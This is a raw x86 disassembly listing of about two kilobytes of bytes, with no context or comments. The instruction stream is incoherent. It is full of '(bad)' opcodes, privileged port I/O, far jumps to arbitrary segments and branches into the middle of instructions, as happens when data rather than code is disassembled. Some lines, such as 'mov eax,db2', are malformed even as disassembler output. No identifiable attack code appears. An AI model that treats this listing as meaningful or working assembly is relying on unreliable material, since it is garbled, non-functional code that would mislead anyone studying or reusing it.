  4226cc:	enter  0x93fc,0x2c
  4226d0:	jmp    0x864f9c16
  4226d5:	pop    edi
  4226d6:	or     BYTE PTR [eax+0x539eeb9a],0x17
  4226dd:	outs   dx,DWORD PTR ds:[esi]
  4226de:	cmp    eax,0xaaf0babf
  4226e3:	sub    DWORD PTR [esi-0x5832b128],0xffffffa0
  4226ea:	jnp    0x42269a
  4226ec:	cdq    
  4226ed:	in     eax,dx
  4226ee:	rol    BYTE PTR [esi+ebp*2-0x4dd2a3d5],cl
  4226f5:	pop    ecx
  4226f6:	and    BYTE PTR [esi*2-0x2f1162c9],ch
  4226fd:	in     al,0xf9
  4226ff:	cmp    BYTE PTR [ecx],dl
  422701:	mov    eax,0x48b9fc6e
  422706:	fstp   QWORD PTR [edx+0x5c]
  422709:	cdq    
  42270a:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42270c:	pop    es
  42270d:	outs   dx,DWORD PTR ds:[esi]
  42270e:	xlat   BYTE PTR ds:[ebx]
  42270f:	sar    DWORD PTR [edx+0x11],cl
  422712:	pop    esp
  422713:	out    0xb9,al
  422715:	push   cs
  422716:	test   esp,ebp
  422718:	inc    esi
  422719:	and    edi,DWORD PTR [ecx+ebp*8-0x62]
  42271d:	mov    ebx,0xdcdf4694
  422722:	adc    ecx,DWORD PTR [eax+0x6d884549]
  422728:	inc    cl
  42272a:	jle    0x422717
  42272c:	pop    ecx
  42272d:	jp     0x4226d6
  42272f:	call   0x8da06261
  422734:	xchg   BYTE PTR [eax-0x3],dl
  422737:	loop   0x4227a8
  422739:	retf   
  42273a:	js     0x422776
  42273c:	jge    0x4226ff
  42273e:	inc    edx
  42273f:	push   ebp
  422740:	or     eax,0xf6556325
  422745:	mov    WORD PTR [eax],gs
  422747:	mov    eax,db2
  42274a:	(bad)  [esi-0x5f673cc2]
  422750:	xchg   esi,eax
  422751:	mov    edi,0x498db1f0
  422756:	xchg   BYTE PTR [ebx-0x126b2720],al
  42275c:	loope  0x4226eb
  42275e:	sbb    BYTE PTR [eax+0x4138d942],dh
  422764:	test   DWORD PTR ds:0xf1114ed7,ebp
  42276a:	sbb    DWORD PTR [esi+0x4fa79708],esp
  422770:	pop    ds
  422771:	out    dx,eax
  422772:	fs push esi
  422774:	cdq    
  422775:	cmp    DWORD PTR [edx+0x48b52dfa],esi
  42277b:	jl     0x4227f2
  42277d:	ret    
  42277e:	mov    fs,WORD PTR [edi-0x677b1c7e]
  422784:	push   esp
  422785:	mov    eax,ds:0x67b0b4f8
  42278a:	xlat   BYTE PTR ds:[ebx]
  42278b:	clc    
  42278c:	xor    ebx,DWORD PTR [ecx]
  42278e:	inc    ecx
  42278f:	jle    0x42273a
  422791:	cmp    al,0x7c
  422793:	loop   0x422789
  422795:	add    al,0x35
  422797:	pop    ebp
  422798:	jns    0x4227ea
  42279a:	or     DWORD PTR [esi-0x661d300f],ebp
  4227a0:	dec    ecx
  4227a1:	test   eax,0x2ce7674d
  4227a6:	test   DWORD PTR [ebp+0x10b4bc8a],ecx
  4227ac:	mov    BYTE PTR [eax+0x24],bl
  4227af:	lds    ebp,FWORD PTR [edi-0x26b38c9a]
  4227b5:	adc    al,0x19
  4227b7:	adc    eax,0xa8bc0a51
  4227bc:	in     al,0x3
  4227be:	in     al,dx
  4227bf:	cs ret 
  4227c1:	repnz fmul QWORD PTR [edi]
  4227c4:	mov    esi,0xcaaead27
  4227c9:	adc    DWORD PTR [edi-0x5f],ebx
  4227cc:	leave  
  4227cd:	dec    edi
  4227ce:	lods   al,BYTE PTR ds:[esi]
  4227cf:	(bad)  
  4227d0:	mov    ebp,0xf2429f95
  4227d5:	mov    ebp,0x91d61001
  4227da:	or     BYTE PTR [eax-0x3724f047],ch
  4227e0:	je     0x422781
  4227e2:	sbb    ecx,DWORD PTR [eax-0x5d]
  4227e5:	mov    bl,0x3e
  4227e7:	outs   dx,DWORD PTR ds:[esi]
  4227e8:	rol    BYTE PTR [ecx-0x15],0x24
  4227ec:	jg     0x4227a4
  4227ee:	xchg   ah,cl
  4227f0:	das    
  4227f1:	sti    
  4227f2:	dec    edx
  4227f3:	inc    esi
  4227f4:	jno    0x42278c
  4227f6:	test   al,0x13
  4227f8:	sbb    BYTE PTR [ecx],cl
  4227fa:	out    0x62,al
  4227fc:	(bad)  
  4227fd:	pop    eax
  4227fe:	leave  
  4227ff:	jg     0x42278b
  422801:	lahf   
  422802:	or     DWORD PTR [edx],ebx
  422804:	es test eax,0xf602a2a0
  42280a:	add    BYTE PTR [ecx+0x5e],cl
  42280d:	and    esp,DWORD PTR [esi-0x6a]
  422810:	in     al,dx
  422811:	test   eax,0x47fe805e
  422816:	call   DWORD PTR [edi-0x4ca42542]
  42281c:	in     al,0xb7
  42281e:	pop    edi
  42281f:	inc    eax
  422820:	jle    0x42289d
  422822:	jo     0x422893
  422824:	fwait
  422825:	cdq    
  422826:	out    dx,al
  422827:	(bad)  
  422828:	hlt    
  422829:	es mov bh,0xc2
  42282c:	shl    ebx,1
  42282e:	test   DWORD PTR [eax],esp
  422830:	xchg   edi,eax
  422831:	mov    al,0x1e
  422833:	push   esi
  422834:	and    eax,0xe7e5e18f
  422839:	out    dx,eax
  42283a:	mov    eax,ds:0x7805341b
  42283f:	inc    ebx
  422840:	mov    cl,0x34
  422842:	xchg   ebp,eax
  422843:	fnstenv [ebp+0xb]
  422846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422847:	add    al,0x1
  422849:	ja     0x42288f
  42284b:	sti    
  42284c:	idiv   BYTE PTR [edi]
  42284e:	bound  ebx,QWORD PTR [ecx]
  422850:	mov    BYTE PTR [ebx+ebp*4],dl
  422853:	lock and bh,dl
  422856:	lock pop ebp
  422858:	xchg   DWORD PTR [edx],ebp
  42285a:	data16 sahf 
  42285c:	les    esi,FWORD PTR [edi]
  42285e:	fwait
  42285f:	add    eax,0x9901d447
  422864:	(bad)  [edx+0x520e82db]
  42286a:	jp     0x4228a6
  42286c:	sbb    DWORD PTR [ebp+0x8],eax
  42286f:	int3   
  422870:	xchg   BYTE PTR [esi+0x783d1d5f],cl
  422876:	push   es
  422877:	scas   al,BYTE PTR es:[edi]
  422878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422879:	or     DWORD PTR [ebx],edi
  42287b:	and    eax,0xa9cd47a3
  422880:	adc    cl,BYTE PTR [esi-0x2d1484d8]
  422886:	sub    esp,edx
  422888:	jbe    0x422878
  42288a:	rcr    BYTE PTR [edi+eiz*2-0x79],1
  42288e:	das    
  42288f:	(bad)  
  422890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422891:	jl     0x4228ee
  422893:	or     edx,DWORD PTR [ecx]
  422895:	or     ebp,ecx
  422897:	outs   dx,DWORD PTR ds:[esi]
  422898:	dec    esi
  422899:	dec    edx
  42289a:	imul   ecx,DWORD PTR ss:[esi+0x39],0x55d33583
  4228a2:	mov    eax,0x1600d223
  4228a7:	add    al,ch
  4228a9:	ins    BYTE PTR es:[edi],dx
  4228aa:	inc    eax
  4228ab:	hlt    
  4228ac:	js     0x42286f
  4228ae:	mov    ecx,es
  4228b0:	fcmovb st,st(2)
  4228b2:	enter  0xe5ad,0xdd
  4228b6:	mov    ebx,0xe9b41af9
  4228bb:	pop    ecx
  4228bc:	out    dx,al
  4228bd:	fs out dx,al
  4228bf:	xor    al,0xe0
  4228c1:	xchg   edi,eax
  4228c2:	retf   
  4228c3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4228c5:	gs in  al,dx
  4228c7:	xlat   BYTE PTR ds:[ebx]
  4228c8:	dec    edx
  4228c9:	cwde   
  4228ca:	fist   WORD PTR [ebp+0x3b]
  4228cd:	mov    bh,BYTE PTR [edi+ecx*4-0x65]
  4228d1:	pop    eax
  4228d2:	cmp    ecx,DWORD PTR cs:[ecx+0x115c92f6]
  4228d9:	push   ebx
  4228da:	popa   
  4228db:	xchg   esi,eax
  4228dc:	stc    
  4228dd:	mov    dh,0xb1
  4228df:	and    dl,BYTE PTR [ecx+0x5ab8e4c2]
  4228e5:	sub    esp,ecx
  4228e7:	popa   
  4228e8:	retw   0xc1a1
  4228ec:	mov    edi,DWORD PTR [esi+esi*1]
  4228ef:	(bad)  
  4228f0:	lods   al,BYTE PTR ds:[esi]
  4228f1:	mov    esi,0x3faa8ded
  4228f6:	push   esi
  4228f7:	pop    esp
  4228f8:	jge    0x422914
  4228fa:	add    al,0x32
  4228fc:	(bad)  
  4228fd:	shr    DWORD PTR [ebx],cl
  4228ff:	inc    edi
  422900:	push   esi
  422901:	inc    di
  422903:	sbb    al,0x9a
  422905:	ins    DWORD PTR es:[edi],dx
  422906:	push   cs
  422907:	loop   0x42289a
  422909:	dec    eax
  42290a:	lds    si,DWORD PTR [ecx+0x60]
  42290e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42290f:	lds    esi,FWORD PTR [edx]
  422911:	addr16 mov al,0x96
  422914:	pop    edx
  422915:	mov    ebx,0xf467648a
  42291a:	sbb    BYTE PTR [ecx+0x6f],cl
  42291d:	stc    
  42291e:	mov    al,ds:0xd3a11d3f
  422923:	jo     0x4228dd
  422925:	cld    
  422926:	cld    
  422927:	aam    0x8f
  422929:	aas    
  42292a:	inc    ebx
  42292b:	or     eax,0x9b5bb682
  422930:	jp     0x4228f6
  422932:	in     eax,dx
  422933:	xor    DWORD PTR [edx],eax
  422935:	push   cs
  422936:	aaa    
  422937:	fcmovne st,st(4)
  422939:	xchg   ecx,eax
  42293a:	loop   0x4229ac
  42293c:	retf   0xaee0
  42293f:	out    dx,al
  422940:	add    ah,cl
  422942:	dec    esp
  422943:	(bad)  
  422944:	jmp    0xf653:0x153a832e
  42294b:	add    al,0x8f
  42294d:	fwait
  42294e:	jg     0x42295c
  422950:	jl     0x4229c7
  422952:	aas    
  422953:	cmc    
  422954:	sbb    BYTE PTR [ebx],al
  422956:	lods   eax,DWORD PTR ds:[esi]
  422957:	scas   eax,DWORD PTR es:[edi]
  422958:	test   al,0xe2
  42295a:	mov    esi,0x1bee33dd
  42295f:	mov    bl,0xb7
  422961:	sub    edx,DWORD PTR [esp+ebx*1+0x70]
  422965:	inc    eax
  422966:	dec    edx
  422967:	enter  0x3df4,0xfe
  42296b:	in     al,dx
  42296c:	jecxz  0x42291c
  42296e:	and    DWORD PTR [edi-0x47],edx
  422971:	in     eax,dx
  422972:	adc    BYTE PTR [edx+0x79],0x16
  422976:	frstor [ebx+0x20ab6d41]
  42297c:	cmp    eax,0x39c36cc9
  422981:	stos   BYTE PTR es:[edi],al
  422982:	xor    edx,DWORD PTR [ecx-0x5d]
  422985:	adc    DWORD PTR [edi+0x8664264],ebp
  42298b:	lods   eax,DWORD PTR ds:[esi]
  42298c:	fisttp WORD PTR [edi-0x13]
  42298f:	into   
  422990:	xchg   edi,eax
  422991:	lock sbb bh,bl
  422994:	adc    BYTE PTR [edi+eax*2+0x13],bl
  422998:	cwde   
  422999:	mov    BYTE PTR [eax-0x1ebd8a93],ah
  42299f:	push   ebx
  4229a0:	mov    edi,0x8946b2ab
  4229a5:	pop    edx
  4229a6:	xchg   edi,eax
  4229a7:	mov    DWORD PTR [edi-0x6df70c99],esp
  4229ad:	imul   ecx,edx,0x2c
  4229b0:	ret    
  4229b1:	xor    BYTE PTR [edx-0x4d],ch
  4229b4:	mov    bh,0x1a
  4229b6:	xor    al,0x6e
  4229b8:	ins    DWORD PTR es:[edi],dx
  4229b9:	xchg   ebp,eax
  4229ba:	or     esi,DWORD PTR [edx]
  4229bc:	jno    0x4229b5
  4229be:	js     0x4229cd
  4229c0:	push   ecx
  4229c1:	push   ds
  4229c2:	data16 mov ds:0xdf0dbb4f,al
  4229c8:	push   0x7b9bb106
  4229cd:	push   edi
  4229ce:	ins    BYTE PTR es:[edi],dx
  4229cf:	arpl   WORD PTR ds:0x4c46d976,si
  4229d5:	pop    ss
  4229d6:	push   ds
  4229d7:	ret    
  4229d8:	fild   QWORD PTR [edx+edi*4]
  4229db:	push   eax
  4229dc:	outs   dx,WORD PTR ds:[esi]
  4229de:	jae    0x4229cb
  4229e0:	fisubr WORD PTR [eax]
  4229e2:	push   ebp
  4229e3:	mov    ch,0xe8
  4229e5:	jae    0x4229d8
  4229e7:	jb     0x422a49
  4229e9:	sub    eax,0x126a7047
  4229ee:	bound  esp,QWORD PTR [esi+0x7a94eeba]
  4229f4:	mov    ah,0x1f
  4229f6:	pop    ss
  4229f7:	fistp  QWORD PTR [ecx-0x2d8572a5]
  4229fd:	xchg   esi,eax
  4229fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229ff:	xchg   edx,eax
  422a00:	push   eax
  422a01:	mov    esp,0x29e8e722
  422a06:	cmp    DWORD PTR [edi+0x5c],edx
  422a09:	aam    0xc2
  422a0b:	push   ss
  422a0c:	mov    ecx,0x3bdb9fd7
  422a11:	jmp    DWORD PTR [esi+0x19a7075d]
  422a17:	sbb    al,0x16
  422a19:	and    eax,DWORD PTR [edx-0x4c]
  422a1c:	sahf   
  422a1d:	loop   0x422a4e
  422a1f:	pop    eax
  422a20:	push   cs
  422a21:	xchg   ecx,eax
  422a22:	inc    ecx
  422a23:	sti    
  422a24:	or     eax,0x2ab388e0
  422a29:	hlt    
  422a2a:	and    edi,DWORD PTR [ebp-0x1aaf40bd]
  422a30:	push   es
  422a31:	or     cl,ah
  422a33:	sbb    ah,dl
  422a35:	jae    0x422a56
  422a37:	push   es
  422a38:	loop   0x422a95
  422a3a:	and    DWORD PTR [edx],ebx
  422a3c:	sbb    bl,0x1e
  422a3f:	test   al,0xaa
  422a41:	cmp    eax,0xba1b0a11
  422a46:	adc    cl,ch
  422a48:	outs   dx,BYTE PTR ds:[esi]
  422a49:	ins    DWORD PTR es:[edi],dx
  422a4a:	test   eax,0x8dc3b927
  422a4f:	inc    ebx
  422a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a51:	xchg   esi,eax
  422a52:	and    al,0xcd
  422a54:	aas    
  422a55:	mov    ds:0x2533b5c7,eax
  422a5a:	xchg   edi,edx
  422a5c:	sbb    DWORD PTR [ecx+ecx*1-0x6e1f82c8],edi
  422a63:	dec    esi
  422a64:	adc    al,0x25
  422a66:	ret    
  422a67:	ss pop ebx
  422a69:	pushf  
  422a6a:	popf   
  422a6b:	push   DWORD PTR [ebx-0x17]
  422a6e:	scas   al,BYTE PTR es:[edi]
  422a6f:	mov    ecx,0x2315ac7c
  422a74:	nop
  422a75:	setne  BYTE PTR [edx]
  422a78:	push   0x2778d9e5
  422a7d:	cs push ecx
  422a7f:	mov    ds:0x79e021cd,eax
  422a84:	mov    WORD PTR [ebx-0x3a],?
  422a87:	in     al,0xdf
  422a89:	xchg   edi,eax
  422a8a:	pop    edx
  422a8b:	les    ebp,FWORD PTR [ecx]
  422a8d:	adc    eax,0x3f730387
  422a92:	test   al,0x71
  422a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a95:	rol    BYTE PTR [esi],1
  422a97:	cmp    BYTE PTR [ebx+0x217c9d5c],0x5a
  422a9e:	inc    esi
  422a9f:	repz dec ebp
  422aa1:	push   ebx
  422aa2:	aaa    
  422aa3:	sub    DWORD PTR [edi-0x2854a322],edx
  422aa9:	lahf   
  422aaa:	fs dec edx
  422aac:	ds ins DWORD PTR es:[edi],dx
  422aae:	pop    ds
  422aaf:	(bad)  
  422ab0:	(bad)
  422ab3:	ficomp WORD PTR [ebx+0x76]
  422ab6:	repz icebp 
  422ab8:	popa   
  422ab9:	(bad)  
  422aba:	loop   0x422aba
  422abc:	xchg   bp,ax
  422abe:	adc    ecx,DWORD PTR [ebx-0x4d]
  422ac1:	hlt    
  422ac2:	es mov ebp,0xf0e4af8a
  422ac8:	mov    esp,0x5633b57d
  422acd:	call   0xcc34:0xb12e266c
  422ad4:	push   eax
  422ad5:	xchg   edx,eax
  422ad6:	in     eax,dx
  422ad7:	dec    ecx
  422ad8:	int    0x5e
  422ada:	cmp    eax,0x833a6ee4
  422adf:	or     al,0x8
  422ae1:	push   es
  422ae2:	es neg bl
  422ae5:	out    dx,al
  422ae6:	jne    0x422aba
  422ae8:	jno    0x422ad8
  422aea:	cmp    dh,BYTE PTR [eax-0x40e8d4ca]
  422af0:	imul   ebp,esi,0xfffffffa
  422af3:	mov    ds:0x83ee9e3,al
  422af8:	std    
  422af9:	retf   
  422afa:	cmp    esp,eax
  422afc:	dec    esp
  422afd:	mov    DWORD PTR [ecx],esi
  422aff:	and    BYTE PTR [eax],dl
  422b01:	ins    DWORD PTR es:[edi],dx
  422b02:	in     eax,dx
  422b03:	aam    0x9
  422b05:	or     eax,DWORD PTR [eax+0x5c1caced]
  422b0b:	in     eax,dx
  422b0c:	je     0x422ad9
  422b0e:	out    dx,eax
  422b0f:	cs int3 
  422b11:	neg    DWORD PTR [edx-0x243e6f51]
  422b17:	fstp   TBYTE PTR [ecx+0x5b60186e]
  422b1d:	push   ss
  422b1e:	push   edi
  422b1f:	push   ds
  422b20:	cmp    esi,ebp
  422b22:	and    ax,WORD PTR [esi+0x64]
  422b26:	jnp    0x422af4
  422b28:	arpl   dx,dx
  422b2a:	pop    ebp
  422b2b:	arpl   WORD PTR [ebx-0x5b],si
  422b2e:	out    dx,al
  422b2f:	or     DWORD PTR [ebp-0x7a27f898],ebx
  422b35:	test   BYTE PTR [esi+eax*8-0x73],al
  422b39:	sub    BYTE PTR [ebx+edi*2-0x56],dl
  422b3d:	mov    edx,eax
  422b3f:	loopne 0x422b26
  422b41:	mov    ecx,0x2688392f
  422b46:	je     0x422bb2
  422b48:	sbb    al,0x59
  422b4a:	push   eax
  422b4b:	jns    0x422bc6
  422b4d:	inc    edx
  422b4e:	jecxz  0x422b18
  422b50:	mov    dh,0x2f
  422b52:	fwait
  422b53:	dec    esp
  422b54:	fiadd  DWORD PTR [edx]
  422b56:	inc    ecx
  422b57:	jns    0x422b1a
  422b59:	mov    ch,0x4d
  422b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b5c:	pop    edi
  422b5d:	xchg   ecx,eax
  422b5e:	clc    
  422b5f:	mov    bl,0xe4
  422b61:	or     BYTE PTR [ecx-0x5],ch
  422b64:	pop    edi
  422b65:	cli    
  422b66:	sbb    ecx,0xacd96462
  422b6c:	xchg   DWORD PTR [ebx+0x2b],esp
  422b6f:	mov    al,0xae
  422b71:	cmp    ebp,DWORD PTR [edi+0x28]
  422b74:	cli    
  422b75:	mov    esp,0x2e980fdf
  422b7a:	call   DWORD PTR [eax]
  422b7c:	mov    edx,0xc6a187a1
  422b81:	outs   dx,DWORD PTR ds:[esi]
  422b82:	pop    edi
  422b83:	xor    DWORD PTR [esp+ebx*2+0x2f8eff19],eax
  422b8a:	sti    
  422b8b:	push   edi
  422b8c:	fcom   DWORD PTR [esp+eiz*4]
  422b8f:	push   es
  422b90:	popa   
  422b91:	dec    esp
  422b92:	stc    
  422b93:	and    ebx,esi
  422b95:	inc    edi
  422b96:	or     cl,BYTE PTR [esi-0x1f288d17]
  422b9c:	xchg   ecx,eax
  422b9d:	stc    
  422b9e:	xor    edx,eax
  422ba0:	popa   
  422ba1:	push   ebp
  422ba2:	cmp    DWORD PTR [eax-0x4f29c2a9],0x6c67bc39
  422bac:	mov    DWORD PTR [esp+ebp*8-0x64],ebx
  422bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bb1:	xor    DWORD PTR [esi+0x64489ef5],edi
  422bb7:	jp     0x422be3
  422bb9:	nop
  422bba:	imul   esp,DWORD PTR [ecx],0xb178928f
  422bc0:	mov    al,ds:0xebf05e40
  422bc5:	iret   
  422bc6:	or     DWORD PTR [ebp+esi*1-0x65579e4c],eax
  422bcd:	or     esp,DWORD PTR [ebp+0x4367d167]
  422bd3:	mov    esi,esi
  422bd5:	and    eax,0x62c16144
  422bda:	push   eax
  422bdb:	out    dx,eax
  422bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bdd:	mov    ebp,0xefb6de81
  422be2:	fstp   st(5)
  422be4:	outs   dx,DWORD PTR ds:[esi]
  422be5:	mov    ds:0xccf0a216,al
  422bea:	imul   edx,DWORD PTR [edi+0x28b9d3d],0x992554ca
  422bf4:	mov    esi,0xfee3dfc0
  422bf9:	lahf   
  422bfa:	pop    ds
  422bfb:	add    ah,cl
  422bfd:	xor    ebp,0x7c
  422c00:	scas   eax,DWORD PTR es:[edi]
  422c01:	sbb    al,0xba
  422c03:	mov    dl,0x9d
  422c05:	clc    
  422c06:	jle    0x422c3e
  422c08:	aam    0x4e
  422c0a:	lds    ebx,FWORD PTR [ebp-0x5f9a8556]
  422c10:	(bad)  
  422c12:	loope  0x422c37
  422c14:	pusha  
  422c15:	cmp    ecx,eax
  422c17:	mov    edx,0x773051ef
  422c1c:	daa    
  422c1d:	mov    esp,DWORD PTR [ebp+0x26]
  422c20:	pop    ds
  422c21:	mov    bl,ah
  422c23:	dec    DWORD PTR [ebx-0x5b]
  422c26:	lahf   
  422c27:	leave  
  422c28:	mov    esi,edi
  422c2a:	jp     0x422c51
  422c2c:	xchg   ebx,eax
  422c2d:	jge    0x422c75
  422c2f:	lea    edx,[ecx+eiz*2-0x538795ac]
  422c36:	xchg   edx,eax
  422c37:	nop
  422c38:	jbe    0x422c80
  422c3a:	cmp    DWORD PTR [ecx+0x68],esp
  422c3d:	dec    edx
  422c3e:	out    dx,al
  422c3f:	dec    ecx
  422c40:	and    ebx,DWORD PTR [ebp-0x4]
  422c43:	data16 ja 0x422c54
  422c46:	adc    BYTE PTR [ebx-0x138ce3f2],0x24
  422c4d:	(bad)  
  422c4f:	jbe    0x422c02
  422c51:	shl    BYTE PTR [esi],1
  422c53:	test   eax,0x39450976
  422c58:	mov    ebx,0xf5396060
  422c5d:	pop    es
  422c5e:	xor    ebp,esi
  422c60:	pop    ebp
  422c61:	in     al,0xa9
  422c63:	pop    ebp
  422c64:	push   ebp
  422c65:	inc    ecx
  422c66:	cmp    DWORD PTR [esi-0x1390658c],esi
  422c6c:	add    DWORD PTR [ebx-0x3173106c],eax
  422c72:	cli    
  422c73:	mov    esp,0x6ad3a065
  422c78:	scas   eax,DWORD PTR es:[edi]
  422c79:	cmp    DWORD PTR ds:0x1cb640be,eax
  422c7f:	ret    0x4434
  422c82:	outs   dx,BYTE PTR ds:[esi]
  422c83:	daa    
  422c84:	in     al,dx
  422c85:	mov    bl,0x9
  422c87:	mov    bl,0x4c
  422c89:	jmp    0xf351:0x3f04e99a
  422c90:	xchg   edi,eax
  422c91:	js     0x422c74
  422c93:	out    0x38,eax
  422c95:	cmp    DWORD PTR ds:0x9407bfed,esp
  422c9b:	adc    al,0x67
  422c9d:	dec    ebp
  422c9e:	repz pop esi
  422ca0:	xor    ah,ch
  422ca2:	or     eax,0xee8799a9
  422ca7:	adc    ecx,DWORD PTR [eax]
  422ca9:	pop    esp
  422caa:	jb     0x422cde
  422cac:	nop
  422cad:	int    0x38
  422caf:	cmc    
  422cb0:	push   0x572bfe68
  422cb5:	mov    dl,0x71
  422cb7:	pop    edi
  422cb8:	mov    dh,0x7a
  422cba:	mov    ds:0x9ce81909,al
  422cbf:	sub    dl,BYTE PTR [ebp-0xdd0f8bb]
  422cc5:	fisttp QWORD PTR [ebx+edx*1-0x7c]
  422cc9:	inc    esi
  422cca:	jns    0x422cdd
  422ccc:	jg     0x422cd9
  422cce:	stc    
  422ccf:	bound  edi,QWORD PTR [eax-0x36]
  422cd2:	fimul  DWORD PTR [edx+edi*8]
  422cd5:	lea    edi,[ecx+0x63]
  422cd8:	mov    ds:0x74057984,al
  422cdd:	xchg   esp,eax
  422cde:	addr16 mov edx,0xb9dfb2e3
  422ce4:	push   ss
  422ce5:	sbb    ebx,ebx
  422ce7:	test   DWORD PTR [ecx+0x8dfd347],eax
  422ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cee:	cwde   
  422cef:	add    edx,ecx
  422cf1:	inc    BYTE PTR [esi-0x4]
  422cf4:	jb     0x422d42
  422cf6:	mov    ebx,0xd9105ce3
  422cfb:	cmp    al,0x4c
  422cfd:	imul   ecx,DWORD PTR [esi],0xffffffed
  422d00:	mov    ebx,0x129bbe85
  422d05:	inc    esi
  422d06:	cmp    BYTE PTR [ebp-0x7619f0af],dl
  422d0c:	jecxz  0x422ce7
  422d0e:	xchg   BYTE PTR [ecx-0x40],ah
  422d11:	pop    esp
  422d12:	(bad)  
  422d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d14:	sbb    eax,0xb82e68e
  422d19:	jp     0x422cfb
  422d1b:	std    
  422d1c:	mov    ch,0x46
  422d1e:	iret   
  422d1f:	sbb    cl,BYTE PTR [edx]
  422d21:	inc    eax
  422d22:	inc    ebx
  422d23:	rol    BYTE PTR [ebx+0x60566fa7],cl
  422d29:	adc    eax,0xe4a33138
  422d2e:	rcl    DWORD PTR [ebx+0x2e370c0f],1
  422d34:	std    
  422d35:	mov    ebp,0x78d4de07
  422d3a:	shr    DWORD PTR [ecx-0x63eb4c2d],1
  422d40:	sub    al,0x13
  422d42:	adc    al,0x2d
  422d44:	mov    ecx,DWORD PTR [edx-0x77]
  422d47:	push   0x1c24e221
  422d4c:	imul   esp,DWORD PTR [edi+0x3bc2cefa],0x1b
  422d53:	add    bl,BYTE PTR [eax+0x37397265]
  422d59:	nop
  422d5a:	jmp    0xda6d:0x66ae8988
  422d61:	ret    
  422d62:	arpl   WORD PTR [edx+0x42c1962c],ax
  422d68:	push   ecx
  422d69:	bound  esp,QWORD PTR [ebx+ebp*1]
  422d6c:	ror    DWORD PTR [ebx],0xf7
  422d6f:	jmp    0x422d03
  422d71:	js     0x422d3f
  422d73:	inc    esi
  422d74:	in     al,0xd7
  422d76:	pop    ebp
  422d77:	lock add ebp,DWORD PTR [esi-0x6c5fe6f7]
  422d7e:	sbb    eax,esp
  422d80:	repz (bad) 
  422d82:	cdq    
  422d83:	push   es
  422d84:	daa    
  422d85:	push   ds
  422d86:	imul   eax,DWORD PTR [ecx+0x7a],0x43
  422d8a:	in     eax,dx
  422d8b:	and    al,0x9c
  422d8d:	mov    esi,0x57b22a53
  422d92:	mov    ah,0x33
  422d94:	inc    eax
  422d95:	psadbw mm4,QWORD PTR [edi]
  422d98:	pop    es
  422d99:	in     eax,dx
  422d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d9b:	std    
  422d9c:	add    DWORD PTR [edi],edx
  422d9e:	jl     0x422e1e
  422da0:	inc    ecx
  422da1:	aaa    
  422da2:	aad    0x4
  422da4:	and    BYTE PTR [ebp-0x1],ch
  422da7:	aas    
  422da8:	xchg   ebx,eax
  422da9:	sbb    esi,ebp
  422dab:	clc    
  422dac:	pop    ebx
  422dad:	jae    0x422e18
  422daf:	sub    ch,dh
  422db1:	lahf   
  422db2:	aas    
  422db3:	sti    
  422db4:	push   ebx
  422db5:	mov    bl,0x29
  422db7:	jmp    0x422e03
  422db9:	cs cmp eax,0x7bb4c58e
  422dbf:	test   DWORD PTR [esi-0x5514ffb],edi
  422dc5:	gs mov ch,0x2a
  422dc8:	lock call 0x2497:0x7f5d3388
  422dd0:	aas    
  422dd1:	jae    0x422e1d
  422dd3:	es cwde 
  422dd5:	inc    esi
  422dd6:	inc    ebp
  422dd7:	pop    edi
  422dd8:	(bad)  
  422dd9:	xchg   edi,eax
  422dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ddb:	repnz pop ss
  422ddd:	xchg   DWORD PTR [esi+0x0],edi
  422de0:	ins    DWORD PTR es:[edi],dx
  422de1:	imul   esp,DWORD PTR [esi+0x17ccbdc0],0x1cba4a00
  422deb:	mov    WORD PTR [esi],es
  422ded:	ret    0xd21a
  422df0:	push   es
  422df1:	xchg   esp,eax
  422df2:	aad    0xb3
  422df4:	rol    dh,0x53
  422df7:	and    ebp,eax
  422df9:	push   esp
  422dfa:	mov    ch,0x42
  422dfc:	pop    es
  422dfd:	test   al,0xa6
  422dff:	fmulp  st(7),st
  422e01:	cdq    
  422e02:	fcom   DWORD PTR [ecx]
  422e04:	mov    al,0x3b
  422e06:	mov    bl,BYTE PTR [ebx+0x27d721f9]
  422e0c:	pop    ebp
  422e0d:	inc    edi
  422e0e:	mov    DWORD PTR [edi+0x76],esp
  422e11:	xor    DWORD PTR [esi+0x31],0xb7ed82a0
  422e18:	and    ebp,edi
  422e1a:	inc    ecx
  422e1b:	pop    ecx
  422e1c:	or     bl,BYTE PTR [ebp-0xe]
  422e1f:	(bad)  
  422e20:	fisttp DWORD PTR [ebx+eax*8]
  422e23:	leave  
  422e24:	into   
  422e25:	jns    0x422dcf
  422e27:	int3   
  422e28:	mov    al,0x29
  422e2a:	or     BYTE PTR [esi],0x5e
  422e2d:	sar    DWORD PTR [edx+0x5c],0x2d
  422e31:	lahf   
  422e32:	test   DWORD PTR [ebx],ebp
  422e34:	out    0x1d,eax
  422e36:	jmp    0x2e33de8e
  422e3b:	aad    0x4e
  422e3d:	cs inc ecx
  422e3f:	std    
  422e40:	in     al,0x2d
  422e42:	jb     0x422e5f
  422e44:	aam    0x6f
  422e46:	(bad)  
  422e47:	mov    ch,0x86
  422e49:	xchg   esi,eax
  422e4a:	imul   edx,DWORD PTR [eax+0x19],0xffffffc4
  422e4e:	sub    ebp,DWORD PTR ds:0x775b3827
  422e54:	enter  0xc1e1,0x87
  422e58:	mov    ds:0xe7882997,eax
  422e5d:	xchg   ebp,eax
  422e5e:	and    BYTE PTR [esi+0x66],bh
  422e61:	push   esp
  422e62:	and    edx,esp
  422e64:	inc    eax
  422e65:	cmp    edi,ecx
  422e67:	mov    al,0xa7
  422e69:	nop
